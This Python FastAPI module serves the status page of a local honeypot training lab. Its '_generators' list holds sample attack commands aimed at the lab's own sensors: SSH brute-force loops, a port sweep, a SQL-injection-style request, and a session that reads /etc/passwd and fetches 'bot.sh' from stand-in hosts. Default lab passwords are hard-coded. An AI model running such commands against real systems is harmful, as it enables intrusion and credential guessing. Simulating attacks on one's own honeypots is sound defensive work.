"""
Local operator status page — GET /health  (HTML) and GET /health/data (JSON).

Single place that answers "is everything up, and what are the URLs / logins?".
Intended for the person running the stack on their own machine:

  * it is NOT authenticated
  * it prints credentials in clear text

That is deliberate for a local demo. Do not expose port 8000 to an untrusted
network with this enabled. Set HEALTH_PAGE=0 in the environment to disable it.
"""

from __future__ import annotations

import asyncio
import os
import time
from datetime import datetime, timezone
from typing import Any, Dict, List

import httpx
from fastapi import APIRouter
from fastapi.responses import HTMLResponse, JSONResponse
from sqlalchemy import text

from app.db.database import DATABASE_URL, engine
from app.services.telemetry.collector import local_collector

router = APIRouter()

_STARTED_AT = time.time()

# Tables the dashboard actually reads from — shown with live row counts so it is
# obvious *where* the data is (telemetry lands in raw_events / normalized_events;
# most other tables are empty until something populates them).
_KEY_TABLES = [
    "users",
    "raw_events",
    "normalized_events",
    "ingest_cursors",
    "attacker_sessions",
    "structured_events",
    "alerts",
    "iocs",
    "nodes",
    "credential_tokens",
    "vm_instances",
]


def _parse_db_url(url: str) -> Dict[str, str]:
    """Pull host/port/user/pass/name out of a SQLAlchemy URL for display."""
    try:
        rest = url.split("://", 1)[1]
        creds, hostpart = rest.split("@", 1)
        user, _, password = creds.partition(":")
        hostport, _, name = hostpart.partition("/")
        host, _, port = hostport.partition(":")
        name = name.split("?", 1)[0]
        return {
            "host": host or "localhost",
            "port": port or "3306",
            "user": user,
            "password": password,
            "name": name,
        }
    except Exception:
        return {"host": "?", "port": "?", "user": "?", "password": "?", "name": "?"}


_DB = _parse_db_url(DATABASE_URL)
# Host-side port (what the browser uses) can differ from the in-container port.
_DB_HOST_PORT = os.getenv("MARIADB_PORT", "3307")
_PHPMYADMIN_PORT = os.getenv("PHPMYADMIN_PORT", "8081")
_BACKEND_PORT = os.getenv("BACKEND_PORT", "8000")
_FRONTEND_PORT = os.getenv("FRONTEND_PORT", "5500")
_MOBSF_PORT = os.getenv("MOBSF_PORT", "5055")
_NODE_API_PORT = os.getenv("NODE_API_PORT", "3000")

# Honeypot host ports (what an attacker connects to). Match docker-compose.yml.
_HP = {
    "ssh": os.getenv("HONEYPOT_SSH_PORT", "2222"),
    "telnet": os.getenv("HONEYPOT_TELNET_PORT", "2223"),
    "smb": os.getenv("HONEYPOT_SMB_PORT", "445"),
    "ftp": os.getenv("HONEYPOT_FTP_PORT", "2121"),
    "mssql": os.getenv("HONEYPOT_MSSQL_PORT", "1433"),
    "ht1": os.getenv("HONEYPOT_HTTP_PORT", "8022"),
    "ht2": os.getenv("HONEYPOT_ALT_PORT", "8023"),
}


def _generators() -> List[Dict[str, str]]:
    """Copy-paste commands that make telemetry land. Host = the machine running
    the stack (use the LAN IP instead of localhost from a second machine)."""
    h = _HP
    return [
        {
            "target": "Every scenario at once — brute-force + port-scan + http + telnet (Cowrie/Dionaea/Honeytrap)",
            "cmd": "./scripts/attack_scenarios.sh localhost all",
        },
        {
            "target": "Synthetic replay — 60 events, no live traffic needed (feeds the real collector)",
            "cmd": "python3 scripts/replay_telemetry.py --all-sensors --count 60 --rate 5",
        },
        {
            "target": f"Cowrie SSH :{h['ssh']} — full session, logs every command (BEST data)",
            "cmd": (
                f"ssh -p {h['ssh']} -o StrictHostKeyChecking=no "
                f"-o UserKnownHostsFile=/dev/null root@localhost\n"
                f"# password: anything. then paste:\n"
                f"whoami; id; uname -a; cat /etc/passwd; ps aux; "
                f"wget http://185.99.1.7/bot.sh; curl http://evil.test/x; ls -la /tmp; exit"
            ),
            "trigger": "ssh_session",
        },
        {
            "target": f"Cowrie SSH :{h['ssh']} — 10 brute-force login attempts (no prompt)",
            "cmd": (
                f"for u in root admin oracle ubuntu pi git test deploy user postgres; do "
                f"ssh -p {h['ssh']} -o BatchMode=yes -o StrictHostKeyChecking=no "
                f"-o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 $u@localhost true 2>/dev/null; done"
            ),
            "trigger": "ssh_bruteforce",
        },
        {
            "target": f"Cowrie Telnet :{h['telnet']}",
            "cmd": f"nc localhost {h['telnet']}    # or: telnet localhost {h['telnet']}",
            "trigger": "telnet",
        },
        {
            "target": f"Dionaea — SMB :{h['smb']} / FTP :{h['ftp']} / MSSQL :{h['mssql']}",
            "cmd": (
                f"nc -w1 -z localhost {h['smb']}; "
                f"curl -s -m3 ftp://localhost:{h['ftp']}/ ; "
                f"nc -w1 -z localhost {h['mssql']}"
            ),
            "trigger": "dionaea",
        },
        {
            "target": f"Honeytrap :{h['ht1']}-{h['ht2']} — HTTP + SQLi-looking request",
            "cmd": (
                f"curl -s 'http://localhost:{h['ht1']}/' ; "
                f"curl -s \"http://localhost:{h['ht2']}/?id=1' OR '1'='1\" ; "
                f"nc -w1 -z localhost {h['ht2']}"
            ),
            "trigger": "honeytrap",
        },
        {
            "target": "Full port sweep (one line, all sensors)",
            "cmd": (
                "for p in %s; do nc -w1 -vz localhost $p 2>&1; done"
                % " ".join([h["ssh"], h["telnet"], h["smb"], h["ftp"], h["mssql"], h["ht1"], h["ht2"]])
            ),
            "trigger": "port_sweep",
        },
    ]


async def _probe(url: str) -> str:
    """'up' if the URL answers anything, 'down' on a connection failure."""
    try:
        async with httpx.AsyncClient(timeout=2.0) as client:
            await client.get(url)
        return "up"
    except Exception:
        return "down"


async def _check_database() -> Dict[str, Any]:
    out: Dict[str, Any] = {"status": "down", "url": f"{_DB['host']}:{_DB['port']}/{_DB['name']}"}
    try:
        async with engine.connect() as conn:
            out["server_version"] = (await conn.execute(text("SELECT VERSION()"))).scalar()
            schemas = (
                await conn.execute(
                    text(
                        "SELECT schema_name FROM information_schema.schemata "
                        "WHERE schema_name NOT IN "
                        "('information_schema','mysql','performance_schema','sys')"
                    )
                )
            ).scalars().all()
            out["schemas"] = list(schemas)

            counts: Dict[str, Any] = {}
            for table in _KEY_TABLES:
                try:
                    counts[table] = (
                        await conn.execute(text(f"SELECT COUNT(*) FROM `{table}`"))
                    ).scalar()
                except Exception:
                    counts[table] = "—"
            out["row_counts"] = counts
        out["status"] = "up"
    except Exception as e:  # noqa: BLE001
        out["error"] = f"{e.__class__.__name__}: {e}"
    return out


async def _check_sensors() -> List[Dict[str, Any]]:
    """
    Sensor liveness without touching the edge network.

    The honeypot containers sit on honeynet_edge, which the backend has no route
    to (by design). But every event they capture lands in normalized_events, so
    'last event within N minutes' is a reliable online signal.
    """
    known = ["cowrie", "dionaea", "honeytrap"]
    seen: Dict[str, Any] = {}
    try:
        async with engine.connect() as conn:
            rows = (
                await conn.execute(
                    text(
                        "SELECT sensor, MAX(timestamp) AS last_seen, COUNT(*) AS n "
                        "FROM normalized_events GROUP BY sensor"
                    )
                )
            ).all()
            for sensor, last_seen, n in rows:
                seen[str(sensor).lower()] = {"last_seen": str(last_seen), "events": int(n)}
    except Exception:
        pass

    now = datetime.now(timezone.utc)
    out = []
    for name in known:
        info = seen.get(name)
        # "no data" not "down": the backend can't see the edge network, so a
        # sensor that never captured anything might just be starved of traffic.
        status = "no data"
        if info and info["last_seen"] and info["last_seen"] != "None":
            try:
                ls = datetime.fromisoformat(info["last_seen"]).replace(tzinfo=timezone.utc)
                status = "up" if (now - ls).total_seconds() < 600 else "idle"
            except Exception:
                status = "unknown"
        out.append(
            {
                "name": name,
                "status": status,
                "last_event": (info or {}).get("last_seen"),
                "events": (info or {}).get("events", 0),
            }
        )
    return out


_CONTAINER_NAMES = (
    "honeynet_backend", "honeynet_frontend", "honeynet_db", "honeynet_phpmyadmin",
    "honeynet_cowrie", "honeynet_dionaea", "honeynet_honeytrap", "honeynet_mobsf",
    "honeynet_clamav", "splunk",
    "guacd", "guacamole", "guacamole_db", "mobsf",
)


async def _check_containers() -> Dict[str, Any]:
    """
    Container status, read only through the central container_manager (the one
    module allowed to touch the Docker socket). Stack services plus any lab
    containers the backend has spawned (label shadowtrust.managed=true).
    """
    try:
        from app.services import container_manager

        if not container_manager.available():
            return {"available": False, "reason": "docker socket unavailable"}
        stack = container_manager.read_stack_status(container_manager.STACK_CONTAINERS)
        rows = [
            {
                "name": name,
                "status": info["status"],
                "health": info["health"] or info["status"],
                "kind": info["kind"],
                "env": info.get("env"),
            }
            for name, info in stack.items()
        ]
        return {"available": True, "containers": sorted(rows, key=lambda r: r["name"])}
    except Exception as e:  # noqa: BLE001
        return {"available": False, "reason": f"{e.__class__.__name__}: {e}"}


async def _build_full_data() -> Dict[str, Any]:
    """
    The complete operator view — includes credentials and copy-paste attack
    commands. **Admin-only.** Served from /api/v1/admin/diagnostics, never from
    the public /health.
    """
    db = await _check_database()

    # Internal probes use the compose service names — reachable from the backend
    # container regardless of host port mapping.
    frontend_status = await _probe(f"http://frontend:{_FRONTEND_PORT}/")
    phpmyadmin_status = await _probe("http://phpmyadmin:80/")
    mobsf_status = await _probe(f"http://mobsf:{_MOBSF_PORT}/")
    # node_api is an optional, unused extras-profile service (services/api/).
    # Nothing in the platform calls it — report "stopped", not "down".
    node_status = await _probe("http://node_api:8000/")
    if node_status != "up":
        node_status = "stopped"
    guac_status = await _probe(
        os.getenv("GUAC_API_URL", "http://localhost:8080/guacamole").rstrip("/") + "/"
    )
    _splunk_api = os.getenv("SPLUNK_API_URL", "https://host.docker.internal:8089").rstrip("/")
    splunk_status = "unknown"
    try:
        async with httpx.AsyncClient(verify=False, timeout=3.0) as _c:
            _r = await _c.get(f"{_splunk_api}/services/server/info")
            splunk_status = "up" if _r.status_code < 500 else "down"
    except Exception:
        splunk_status = "down"

    # ClamAV — raw TCP PING/PONG on the clamd port (no HTTP).
    clamav_status = "down"
    try:
        _host = os.getenv("CLAMAV_HOST", "clamav")
        _port = int(os.getenv("CLAMAV_PORT", "3310"))
        _r, _w = await asyncio.wait_for(asyncio.open_connection(_host, _port), timeout=3.0)
        _w.write(b"zPING\x00")
        await _w.drain()
        _resp = await asyncio.wait_for(_r.read(16), timeout=3.0)
        _w.close()
        clamav_status = "up" if b"PONG" in _resp else "down"
    except Exception:
        clamav_status = "down"

    services: List[Dict[str, Any]] = [
        {
            "name": "Dashboard (frontend)",
            "link": f"http://localhost:{_FRONTEND_PORT}",
            "status": frontend_status,
        },
        {
            "name": "phpMyAdmin",
            "link": f"http://localhost:{_PHPMYADMIN_PORT}",
            "status": phpmyadmin_status,
        },
        {
            "name": "Backend API docs",
            "link": f"http://localhost:{_BACKEND_PORT}/docs",
            "status": "up",  # if you're reading this, it's up
        },
        {
            "name": "MariaDB",
            "link": f"mysql://localhost:{_DB_HOST_PORT}",
            "status": db["status"],
        },
        {
            "name": "Guacamole (VM Lab remote desktop)",
            "link": f"http://localhost:{os.getenv('GUAC_PORT', '8080')}/guacamole",
            "status": guac_status,
            "note": "backs vm_lab.html — guacadmin / guacadmin",
        },
        {
            "name": "MobSF (APK analysis)",
            "link": f"http://localhost:{_MOBSF_PORT}",
            "status": mobsf_status,
            "note": "backs apk.html",
        },
        {
            "name": "ClamAV (malware engine)",
            "link": f"tcp://{os.getenv('CLAMAV_HOST', 'clamav')}:{os.getenv('CLAMAV_PORT', '3310')}",
            "status": clamav_status,
            "note": "backs malware.html — first boot downloads ~1.5 GB of signatures (~5 min)",
        },
        {
            "name": "Splunk Blue Team",
            "link": os.getenv("SPLUNK_WEB_URL", "http://localhost:8009"),
            "status": splunk_status,
            "note": "backs splunk.html — separate project: cd ~/splunk-lab && docker compose up -d",
        },
        {
            "name": "Node API (not needed)",
            "link": f"http://localhost:{_NODE_API_PORT}",
            "status": node_status,
            "note": "optional legacy service — nothing uses it. Start only if you want it: "
                    "docker compose --profile extras up -d node_api worker",
        },
    ]

    return {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "backend": {
            "status": "up",
            "uptime_seconds": round(time.time() - _STARTED_AT),
            "infra_provider": os.getenv("INFRA_PROVIDER", "local"),
        },
        "database": db,
        "services": services,
        "sensors": await _check_sensors(),
        "containers": await _check_containers(),
        "collector": local_collector.status(),
        "generators": _generators(),
        "event_total": (db.get("row_counts") or {}).get("normalized_events", 0),
        "credentials": {
            "app_admin": {
                "login_url": f"http://localhost:{_FRONTEND_PORT}/login.html",
                "email": "admin@gmail.com",
                "password": "admin",
                "note": "seeded on first boot — change it",
            },
            "database": {
                "host_from_browser_tools": f"127.0.0.1:{_DB_HOST_PORT}",
                "host_in_compose": f"{_DB['host']}:{_DB['port']}",
                "database": _DB["name"],
                "user": _DB["user"],
                "password": _DB["password"],
                "root_password": os.getenv("MARIADB_ROOT_PASSWORD", "(see root .env)"),
                "test_schema": "shadowtrust_test",
            },
            "phpmyadmin": {
                "url": f"http://localhost:{_PHPMYADMIN_PORT}",
                "server": _DB["host"],
                "user": _DB["user"],
                "password": _DB["password"],
                "tip": "data lives in raw_events / normalized_events / users — "
                "most other tables are empty until the platform generates that data",
            },
            "guacamole": {
                "url": f"http://localhost:{os.getenv('GUAC_PORT', '8080')}/guacamole",
                "user": "guacadmin",
                "password": "guacadmin",
                "note": "backs vm_lab.html; also open it directly to see live lab sessions",
            },
            "vm_lab": {
                "url": f"http://localhost:{_FRONTEND_PORT}/vm_lab.html",
                "kali_lab_login": f"{os.getenv('LAB_KALI_USER', 'kali')} / {os.getenv('LAB_KALI_PASSWORD', 'kali')}",
                "windows_labs": (
                    "enabled" if os.getenv("LAB_WINDOWS_ENABLED", "false").lower() in ("1", "true", "yes")
                    else "disabled (LAB_WINDOWS_ENABLED=false; needs a Linux host with KVM)"
                ),
            },
            "splunk": {
                "page": f"http://localhost:{_FRONTEND_PORT}/splunk.html",
                "console": os.getenv("SPLUNK_WEB_URL", "http://localhost:8009"),
                "login": f"{os.getenv('SPLUNK_USER', 'admin')} / {os.getenv('SPLUNK_PASSWORD', 'ChangeMe123!')}",
                "start": "cd ~/splunk-lab && docker compose up -d",
            },
        },
    }


_SECRET_DB_KEYS = {"user", "password", "root_password", "host", "port"}


def _safe_view(full: Dict[str, Any]) -> Dict[str, Any]:
    """
    Strip every secret and every actionable attack command from the full view.
    This is the ONLY payload the unauthenticated /health surface emits.
    """
    db = full.get("database", {}) or {}
    safe_db = {
        "status": db.get("status"),
        "server_version": db.get("server_version"),
        "schemas": db.get("schemas", []),
    }
    if db.get("error"):
        safe_db["error"] = "connection error"  # generic — no host/user leak

    collector = full.get("collector", {}) or {}
    safe_collector = {
        "running": collector.get("running"),
        "cycles": collector.get("cycles"),
        "last_run_at": collector.get("last_run_at"),
        "last_cycle_at": collector.get("last_cycle_at"),
    }

    safe_services = [
        {"name": s.get("name"), "status": s.get("status")}
        for s in full.get("services", [])
    ]

    return {
        "generated_at": full.get("generated_at"),
        "backend": full.get("backend", {}),
        "database": safe_db,
        "services": safe_services,
        "sensors": full.get("sensors", []),
        "containers": {
            "available": (full.get("containers") or {}).get("available", False),
            "count": len((full.get("containers") or {}).get("containers", [])),
        },
        "collector": safe_collector,
        "event_total": full.get("event_total", 0),
    }


@router.get("/health/data")
async def health_data() -> JSONResponse:
    if os.getenv("HEALTH_PAGE", "0") == "0":
        return JSONResponse({"detail": "health page disabled (HEALTH_PAGE=0)"}, status_code=404)
    return JSONResponse(_safe_view(await _build_full_data()))


@router.get("/health", response_class=HTMLResponse)
async def health_page() -> HTMLResponse:
    # Fail-closed: the status page is OFF unless HEALTH_PAGE=1 is set explicitly.
    if os.getenv("HEALTH_PAGE", "0") == "0":
        return HTMLResponse("<h1>health page disabled (HEALTH_PAGE=0)</h1>", status_code=404)
    return HTMLResponse(_PAGE)


async def build_admin_diagnostics() -> Dict[str, Any]:
    """Full detail for the authenticated admin diagnostics endpoint."""
    return await _build_full_data()


_PAGE = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Shadow Trust · Status</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body {
    margin: 0; padding: 24px;
    font: 14px/1.5 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
    background: #0a0e14; color: #c9d1d9;
  }
  h1 { font-size: 18px; margin: 0 0 4px; color: #58e1c1; letter-spacing: .5px; }
  h2 { font-size: 13px; text-transform: uppercase; letter-spacing: 1px;
       color: #7d8590; margin: 28px 0 10px; border-bottom: 1px solid #1c2128; padding-bottom: 6px; }
  a { color: #58a6ff; text-decoration: none; }
  a:hover { text-decoration: underline; }
  .sub { color: #7d8590; margin-bottom: 8px; }
  table { border-collapse: collapse; width: 100%; max-width: 900px; }
  td, th { text-align: left; padding: 6px 12px 6px 0; vertical-align: top; }
  th { color: #7d8590; font-weight: 600; font-size: 12px; }
  .dot { display: inline-block; width: 9px; height: 9px; border-radius: 50%; margin-right: 7px; }
  .up { background: #3fb950; } .down { background: #f85149; }
  .unknown { background: #d29922; } .pill-up { color: #3fb950; }
  .pill-down { color: #f85149; } .pill-unknown { color: #d29922; }
  code { background: #161b22; padding: 2px 6px; border-radius: 4px; color: #e6edf3; }
  .grid { display: grid; grid-template-columns: 180px 1fr; gap: 4px 16px; max-width: 760px; }
  .grid div:nth-child(odd) { color: #7d8590; }
  .note { color: #7d8590; font-size: 12px; }
  .card { background: #0d1117; border: 1px solid #1c2128; border-radius: 8px; padding: 14px 16px; margin-bottom: 12px; max-width: 760px; }
  .warn { color: #d29922; }
  #err { color: #f85149; }
  .muted { opacity: .55; }
  .gen { background: #0d1117; border: 1px solid #1c2128; border-radius: 8px;
         padding: 10px 12px; margin-bottom: 8px; max-width: 900px; }
  .gen .t { color: #58e1c1; font-size: 12px; margin-bottom: 6px; }
  .gen pre { margin: 0; white-space: pre-wrap; word-break: break-word; color: #e6edf3; font-size: 13px; }
  .cp { float: right; background: #21262d; color: #c9d1d9; border: 1px solid #30363d;
        border-radius: 5px; padding: 2px 10px; font: inherit; font-size: 12px; cursor: pointer; }
  .cp:hover { background: #30363d; }
  .cp.ok { color: #3fb950; border-color: #238636; }
  #counter { font-size: 22px; color: #58e1c1; }
  #delta { color: #3fb950; }
</style>
</head>
<body>
  <h1>SHADOW TRUST · LOCAL STATUS</h1>
  <div class="sub">auto-refresh 10s · <span id="ts">…</span> · <a href="/health/data">raw json</a></div>
  <div id="err"></div>

  <h2>Services</h2>
  <table id="services"><tbody></tbody></table>

  <h2>Honeypot sensors <span class="note">(via last captured event — edge network is isolated)</span></h2>
  <table id="sensors"><tbody></tbody></table>

  <h2>Telemetry <span class="note">(edge network is isolated — count is the online signal)</span></h2>
  <div class="card">
    normalized_events: <span id="counter">…</span> <span id="delta"></span>
    <div class="note">opened this page at <span id="baseline">…</span></div>
  </div>

  <h2>Containers</h2>
  <div id="containers" class="note">…</div>

  <h2>Database</h2>
  <div id="db"></div>

  <h2>Telemetry collector</h2>
  <div id="collector" class="grid"></div>

  <div class="note" style="margin-top:28px">
    Credentials, DB details and attack commands live in the authenticated
    <code>/api/v1/admin/diagnostics</code> endpoint (admin role required).
  </div>

<script>
const $ = (s) => document.querySelector(s);
const esc = (s) => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
const dot = (s, label) => { const k = s==='up'?'up':s==='down'?'down':'unknown';
  return `<span class="dot ${k}"></span><span class="pill-${k}">${esc(label||s)}</span>`; };

function renderServices(list) {
  $('#services').innerHTML =
    '<tr><th>service</th><th>status</th></tr>' +
    (list||[]).map(s =>
      `<tr><td>${esc(s.name)}</td><td>${dot(s.status)}</td></tr>`
    ).join('');
}

let _baseline = null;

function renderGenerators(list) {
  if (document.querySelector('#generators').dataset.done) return;
  document.querySelector('#generators').dataset.done = '1';
  document.querySelector('#generators').innerHTML = (list||[]).map((g, i) => `
    <div class="gen">
      <button class="cp" data-i="${i}">copy</button>
      <div class="t">${esc(g.target)}</div>
      <pre id="gen${i}">${esc(g.cmd)}</pre>
    </div>`).join('');
  document.querySelectorAll('#generators .cp').forEach(btn => {
    btn.onclick = async () => {
      const txt = document.querySelector('#gen' + btn.dataset.i).textContent;
      try { await navigator.clipboard.writeText(txt); } catch (e) {}
      btn.textContent = 'copied'; btn.classList.add('ok');
      setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('ok'); }, 1500);
    };
  });
}

function renderCounter(total) {
  if (_baseline === null) {
    _baseline = total;
    document.querySelector('#baseline').textContent = total + ' events';
  }
  document.querySelector('#counter').textContent = total;
  const d = total - _baseline;
  document.querySelector('#delta').textContent = d > 0 ? `(+${d} since you opened this page)` : '';
}

function renderSensors(list) {
  $('#sensors').innerHTML =
    '<tr><th>sensor</th><th>status</th><th>events</th><th>last event</th></tr>' +
    (list||[]).map(s => {
      const k = s.status==='up'?'up':(s.status==='idle'||s.status==='no data')?'unknown':'down';
      return `<tr><td>${esc(s.name)}</td><td>${dot(k, s.status)}</td>`
        + `<td${s.events?'':' class="muted"'}>${esc(s.events)}</td><td class="note">${esc(s.last_event||'—')}</td></tr>`;
    }).join('');
}

function renderContainers(c) {
  if (!c || !c.available) {
    $('#containers').innerHTML = `<span class="muted">docker socket unavailable — run <code>docker compose ps</code>.</span>`;
    return;
  }
  $('#containers').innerHTML =
    `<span class="pill-up">${esc(c.count)} managed / stack containers seen</span>` +
    `<div class="note">full per-container detail is in <code>/api/v1/admin/diagnostics</code></div>`;
}

function renderDb(db) {
  let h = `<div class="card"><div class="grid">
    <div>status</div><div>${dot(db.status)}</div>
    <div>server</div><div>${esc(db.server_version||'?')}</div>
    <div>schemas</div><div>${esc((db.schemas||[]).join(', '))}</div>
  </div>`;
  if (db.error) h += `<div class="warn">${esc(db.error)}</div>`;
  h += '</div>';
  $('#db').innerHTML = h;
}

function renderCollector(c) {
  const rows = {
    running: c.running, cycles: c.cycles,
    last_run_at: c.last_run_at, last_cycle_at: c.last_cycle_at
  };
  $('#collector').innerHTML = Object.entries(rows)
    .map(([k,v]) => `<div>${esc(k)}</div><div>${esc(v)}</div>`).join('');
}

async function tick() {
  try {
    const r = await fetch('/health/data', {cache: 'no-store'});
    const d = await r.json();
    $('#err').textContent = '';
    $('#ts').textContent = new Date(d.generated_at).toLocaleTimeString() +
      '  ·  backend up ' + d.backend.uptime_seconds + 's  ·  provider ' + d.backend.infra_provider;
    renderServices(d.services);
    renderSensors(d.sensors);
    renderCounter(d.event_total);
    renderContainers(d.containers);
    renderDb(d.database);
    renderCollector(d.collector);
  } catch (e) {
    $('#err').textContent = 'could not load /health/data — is the backend up? ' + e;
  }
}
tick();
setInterval(tick, 10000);
</script>
</body>
</html>
"""
